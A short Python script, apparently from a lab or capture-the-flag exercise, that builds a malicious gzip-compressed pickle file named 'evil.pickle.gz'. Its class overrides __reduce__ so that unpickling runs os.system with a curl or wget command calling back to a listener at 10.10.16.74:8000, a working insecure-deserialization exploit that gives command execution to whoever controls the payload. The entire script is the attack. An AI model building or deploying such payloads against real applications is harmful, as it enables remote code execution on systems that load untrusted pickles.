# make_pickle_test.py
import pickle, gzip, os

class E:
    def __reduce__(self):
        cmd = "curl -s http://10.10.16.74:8000/hit || wget -q -O- http://10.10.16.74:8000/hit"
        return (os.system, (cmd,))

with gzip.open("evil.pickle.gz", "wb") as f:
    f.write(pickle.dumps(E()))
print("test pickle created")
